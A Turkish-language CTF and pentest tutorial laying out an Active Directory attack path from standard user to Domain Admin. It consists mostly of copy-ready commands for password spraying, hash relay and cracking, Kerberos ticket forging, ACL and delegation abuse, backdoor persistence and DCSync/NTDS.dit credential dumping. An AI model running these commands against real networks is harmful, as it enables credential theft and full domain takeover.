# 🏢 Active Directory Saldırı Metodolojisi

[🇬🇧 English](../../README.md) • [🇮🇹 Versione Italiana](README.it.md)

```
    █████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
   ███████║██║  ██║   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
   ██╔══██║██║  ██║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
   ██║  ██║██████╔╝   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═╝  ╚═╝╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
         Standart Kullanıcıdan Domain Admin Yetkisine Adım Adım Rehber
```

<p align="center">
  <img src="https://img.shields.io/badge/AD-Metodoloji-red?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/CTF-Kılavuzu-blue?style=for-the-badge" alt="CTF">
  <img src="https://img.shields.io/badge/Domain_Admin-green?style=for-the-badge" alt="DA">
</p>

---

## 🗺️ Saldırı Yolu Genel Bakışı (Attack Path Overview)

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    ACTIVE DIRECTORY SALDIRI METODOLOJİSİ                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   FAZ 1: Keşif (Enum)      FAZ 2: İlk Erişim          FAZ 3: Yetki Yüks.│
│   ├── Ağ Taraması          ├── Password Spraying      ├── Kerberoasting │
│   ├── LDAP Keşfi           ├── LLMNR/NBT-NS Poison    ├── AS-REP Roast  │
│   ├── Kullanıcı Keşfi      └── NTLM Relay             └── ACL İstismarı │
│   └── BloodHound                                                        │
│                                                                         │
│   FAZ 4: Yatay İlerleme    FAZ 5: Kalıcılık           FAZ 6: Tam Hakimiyet│
│   ├── Pass-the-Hash        ├── Golden Ticket          ├── DCSync        │
│   ├── WinRM / PSExec       ├── Silver Ticket          ├── NTDS.dit      │
│   └── WMI Exec             └── Skeleton Key           └── Full Domain!  │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 İçindekiler

1. [Faz 1: Keşif ve Numaralandırma (Enumeration)](#-faz-1-keşif-ve-numaralandırma-enumeration)
2. [Faz 2: İlk Erişim (Initial Access)](#-faz-2-ilk-erişim-initial-access)
3. [Faz 3: Yetki Yükseltme (Privilege Escalation)](#-faz-3-yetki-yükseltme-privilege-escalation)
4. [Faz 4: Yatay İlerleme (Lateral Movement)](#-faz-4-yatay-ilerleme-lateral-movement)
5. [Faz 5: Kalıcılık Sağlama (Persistence)](#-faz-5-kalıcılık-sağlama-persistence)
6. [Faz 6: Domain Hakimiyeti (Domain Dominance)](#-faz-6-domain-hakimiyeti-domain-dominance)
7. [Hızlı Komut Başvuru Tablosu](#-hızlı-komut-başvuru-tablosu)
8. [CTF İpuçları](#-ctf-ipuçları)

---

## 🔍 Faz 1: Keşif ve Numaralandırma (Enumeration)

### 1.1 Ağ Keşfi

```bash
# Domain Controller (DC) sunucularını bulma
nmap -p 53,88,389,636,445 10.10.10.0/24

# Hedefte AD servislerini tespit etme
nmap -p 88,135,139,389,445,464,636,3268,3269 -sV 10.10.10.10
```

**Kritik Portlar:**
| Port | Servis | Görevi |
|------|--------|--------|
| 53 | DNS | Domain isim çözümleme |
| 88 | Kerberos | Kimlik doğrulama |
| 389 | LDAP | Dizin servisi sorgulama |
| 445 | SMB | Dosya paylaşımları ve RPC |
| 636 | LDAPS | Güvenli LDAP |
| 5985 | WinRM | Uzaktan yönetim (HTTP) |

### 1.2 Kimlik Bilgisi Olmadan Anonim Keşif (No Creds)

```bash
# RPC null session (boş oturum)
rpcclient -U "" -N 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

# Anonim LDAP sorgulaması
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"

# Enum4linux ile genel AD taraması
enum4linux -a 10.10.10.10

# Kerbrute ile parolasız kullanıcı adı keşfi
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```

### 1.3 Geçerli Bir Kullanıcı ile Keşif (With Valid Credentials)

```bash
# Domain bilgilerini çekme (CrackMapExec)
crackmapexec smb 10.10.10.10 -u user -p password --users
crackmapexec smb 10.10.10.10 -u user -p password --groups
crackmapexec smb 10.10.10.10 -u user -p password --shares

# LDAP dizin dökümü alma
ldapdomaindump -u 'DOMAIN\user' -p 'password' 10.10.10.10
```

### 1.4 PowerView ile Keşif

```powershell
# PowerView modülünü içe aktarma
Import-Module .\PowerView.ps1

# Domain ve Domain Controller bilgileri
Get-Domain
Get-DomainController

# Hedef kullanıcı ve bilgisayarları bulma
Get-DomainUser -SPN                    # Kerberoast edilebilir hesaplar
Get-DomainUser -PreauthNotRequired      # AS-REP roast edilebilir hesaplar
Get-DomainComputer -Unconstrained       # Delegasyon zafiyeti olan bilgisayarlar

# Aktif Domain Admin oturumlarını arama
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

### 1.5 BloodHound Veri Toplama

```bash
# Linux üzerinden (bloodhound-python)
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c All

# Windows üzerinden (SharpHound)
.\SharpHound.exe -c All
```

**Kritik BloodHound Cypher Sorguları:**
```cypher
# Domain Admin'e giden en kısa yol:
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Kerberoast edilebilir kullanıcılar:
MATCH (u:User {hasspn:true}) RETURN u.name

# DCSync yetkisine sahip kullanıcılar:
MATCH (u:User)-[:DCSync|:GetChanges|:GetChangesAll]->(d:Domain) RETURN u.name
```

---

## 🔑 Faz 2: İlk Erişim (Initial Access)

### 2.1 Parola Püskürtme (Password Spraying)

Hesap kilitleme (lockout) eşiklerine dikkat ederek her kullanıcı için tek parola denemesi:

```bash
# CrackMapExec ile püskürtme
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success

# Kerbrute ile hızlı püskürtme
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'
```

**Yaygın Kurumsal Parolalar:**
```
Mevsim+Yıl: Sonbahar2024!, Summer2024!, Kis2024!
SirketAdi+Yıl: Sirket2024!
Standart: Welcome1, Password1, 12345678!
```

### 2.2 LLMNR / NBT-NS Zehirleme (Poisoning)

```bash
# Terminal 1: Responder'ı başlatın
sudo responder -I eth0 -wPv

# Ağdaki NTLMv2 hash yakalamalarını bekleyin...

# Terminal 2: Yakalanan NTLMv2 hash'ini kırın
hashcat -m 5600 hash.txt rockyou.txt
```

### 2.3 NTLM Relay Saldırısı

```bash
# SMB Signing (İmzalama) zorunlu olmayan hedefleri tespit etme
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Responder'ı SMB ve HTTP kapalı başlatma
sudo responder -I eth0

# Relay saldırısını başlatma (gelen kimlik doğrulamasını başka hedefe yönlendirme)
impacket-ntlmrelayx -tf relay.txt -smb2support
```

### 2.4 AS-REP Roasting (Parola Gerektirmez!)

`DONT_REQ_PREAUTH` bayrağı ayarlanmış hesaplar için ön kimlik doğrulama gerekmez:

```bash
# Parolasız zafiyetli kullanıcıları tespit etme ve hash alma
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Veya elde edilen bir kullanıcı bilgisiyle sorgulama
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Hashcat ile kırma
hashcat -m 18200 asrep.txt rockyou.txt
```

---

## ⬆️ Faz 3: Yetki Yükseltme (Privilege Escalation)

### 3.1 Kerberoasting

Servis hesaplarının (SPN) TGS biletlerini alarak çevrimdışı hash kırma:

```bash
# Linux üzerinden Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Windows üzerinden Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Hashcat ile kırma
hashcat -m 13100 kerberoast.txt rockyou.txt
```

### 3.2 ACL (Erişim Kontrol Listesi) İstismarı

**Kullanıcı Üzerinde `GenericAll`:**
```powershell
# Hedef kullanıcının parolasını zorla değiştirme
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

**Grup Üzerinde `GenericAll`:**
```powershell
# Kendinizi hedef gruba ekleme
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
```

**`GenericWrite` Yetkisi:**
```powershell
# Kullanıcıya sahte SPN atayarak Kerberoast edilebilir hale getirme
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='any/thing'}
```

**`WriteDACL` Yetkisi:**
```powershell
# Kendinize DCSync yetkisi verme
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

### 3.3 Delegasyon Saldırıları (Delegation)

**Sınırsız Delegasyon (Unconstrained Delegation):**
```powershell
# Hedef makineleri tespit etme
Get-DomainComputer -Unconstrained

# Belleğe düşen TGT biletlerini dinleme
.\Rubeus.exe monitor /interval:5 /targetuser:DC$

# PrinterBug ile tetikleme
SpoolSample.exe DC01 YOURHOST
```

**Sınırlı Delegasyon (Constrained Delegation):**
```bash
# Servis hesabı üzerinden admin adına bilet talep etme
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/serviceaccount:password -dc-ip 10.10.10.10

# Bileti kullanma
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@target.domain.local
```

**Kaynak Tabanlı Sınırlı Delegasyon (RBCD):**
```bash
# Sahte makine hesabı oluşturma
addcomputer.py -computer-name FAKE01 -computer-pass 'Password123!' domain.local/user:password

# Hedef makinede RBCD yapılandırması
rbcd.py -delegate-from FAKE01 -delegate-to TARGET -action write domain.local/user:password

# Administrator adına servis bileti alma
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/FAKE01:'Password123!'
```

---

## ➡️ Faz 4: Yatay İlerleme (Lateral Movement)

### 4.1 Pass-the-Hash (PtH)

Parolayı çözmeden NTLM hash'i doğrudan kullanarak oturum açma:

```bash
# Impacket PSExec
impacket-psexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# Impacket WMIExec (daha sessiz)
impacket-wmiexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# Impacket SMBExec
impacket-smbexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# CrackMapExec ile komut çalıştırma
crackmapexec smb 10.10.10.10 -u admin -H NTLMHASH -x "whoami"
```

### 4.2 Pass-the-Ticket (PtT)

```bash
# Windows üzerinden bilet dökümü alma (Rubeus)
.\Rubeus.exe dump

# Linux üzerinde Kerberos bileti kullanma
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/admin@target

# Windows üzerinde bilet enjekte etme
.\Rubeus.exe ptt /ticket:base64ticket
```

### 4.3 WinRM ile Uzaktan Yönetim

```bash
# Parola ile bağlanma
evil-winrm -i 10.10.10.10 -u admin -p password

# NTLM hash ile bağlanma
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH
```

### 4.4 Overpass-the-Hash

```bash
# NTLM hash verip Kerberos TGT bileti alma
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Artık Kerberos yetkileriyle paylaşımlara erişme
dir \\server\share
```

---

## 🔒 Faz 5: Kalıcılık Sağlama (Persistence)

### 5.1 Golden Ticket (Altın Bilet)

`krbtgt` hesabının NTLM hash'i ile sınırsız süreli ve istenen yetkide TGT bileti üretme:

```bash
# Linux Impacket ile üretme
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator

# Bileti kullanma
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

```powershell
# Windows Mimikatz ile üretme
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

### 5.2 Silver Ticket (Gümüş Bilet)

Belirli bir servisin (CIFS, HTTP, LDAP vb.) hash'ini kullanarak sahte TGS bileti üretme:

```bash
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
```

### 5.3 DCSync Arka Kapısı (Backdoor)

```powershell
# Herhangi bir standart kullanıcıya gizlice DCSync hakları verme
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity backdooruser -Rights DCSync
```

---

## 👑 Faz 6: Domain Hakimiyeti (Domain Dominance)

### 6.1 DCSync Saldırısı

Domain Controller gibi davranarak Active Directory veritabanındaki tüm kullanıcı hash'lerini çekme:

```bash
# Tüm kullanıcıların NTLM hash dökümü
impacket-secretsdump domain.local/admin:password@10.10.10.10

# Hash ile çalıştırma
impacket-secretsdump -hashes :NTLMHASH domain.local/admin@10.10.10.10

# Belirli bir kullanıcıyı çekme (örn: administrator veya krbtgt)
impacket-secretsdump domain.local/admin:password@10.10.10.10 -just-dc-user administrator
```

### 6.2 NTDS.dit Dosyası Çıkarma

```bash
# Volume Shadow Copy (VSS) oluşturma
vssadmin create shadow /for=C:

# NTDS.dit ve SYSTEM registry kovanını kopyalama
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system

# Çevrimdışı döküm alma
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

### 6.3 CrackMapExec ile DCSync

```bash
crackmapexec smb DC01 -u admin -p password --ntds
```

---

## 📊 Hızlı Komut Başvuru Tablosu

### Tek Satırlık Keşif Komutları

```bash
# DC tespiti
nmap -p 88,389 --open 10.10.10.0/24

# Parolasız kullanıcı keşfi
kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/wordlists/names.txt

# AS-REP roast edilebilir hesapları bulma
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# Kerberoast biletlerini isteme
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
```

### Saldırı Özeti

| Saldırı Türü | Komut |
|--------------|-------|
| Password Spray | `crackmapexec smb DC -u users.txt -p 'Pass123!'` |
| AS-REP Roast | `GetNPUsers.py domain.local/ -usersfile u.txt -dc-ip DC` |
| Kerberoast | `GetUserSPNs.py domain.local/u:p -dc-ip DC -request` |
| DCSync | `secretsdump.py domain.local/admin:pass@DC` |
| Pass-the-Hash | `psexec.py -hashes :HASH domain.local/admin@target` |
| Golden Ticket | `ticketer.py -nthash KRBTGT -domain-sid SID -domain domain.local admin` |

### Hash Kırma Modları (Hashcat)

| Hash Türü | Hashcat Modu |
|-----------|--------------|
| NTLM | `-m 1000` |
| NTLMv2 | `-m 5600` |
| Kerberoast (TGS-REP) | `-m 13100` |
| AS-REP (krb5asrep) | `-m 18200` |

---

## 🎯 CTF İpuçları

1. **Önce daima keşif yapın:** Körlemesine saldırmayın, portları ve paylaşımları listeleyin.
2. **AS-REP Roasting'i mutlaka test edin:** Parola gerektirmeden doğrudan hash düşebilir!
3. **BloodHound çalıştırın:** Gözden kaçan gizli izinleri ve atlama noktalarını görselleştirin.
4. **ACL izinlerini inceleyin:** `GenericAll`, `WriteDacl` gibi haklar genelde zafiyet kaynağıdır.
5. **Delegasyon açıklarını araştırın:** Unconstrained veya RBCD ile kolayca Domain Admin olunabilir.
6. **Dikkatli spray yapın:** Hesap kilitleme eşiklerini kontrol etmeden büyük listeler denemeyin.
7. **Tüm kimlik bilgilerini not edin:** Bir CTF veya pentestte bulunan her parola başka bir yerde işe yarayacaktır.

---

## 📚 İlgili Araç Kılavuzları

- [BloodHound](../../BloodHound/README.md)
- [Impacket](../../Impacket/README.md)
- [CrackMapExec](../../CrackMapExec/README.md)
- [Rubeus](../../Rubeus/README.md)
- [PowerView](../../PowerView/README.md)
- [Responder](../../Responder/README.md)
- [Evil-WinRM](../../Evil-WinRM/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

<p align="center">
  <b>🏢 Standart Kullanıcıdan Domain Admin'e!</b><br>
  <i>Metodolojiyi izleyin, etki alanına hükmedin.</i>
</p>
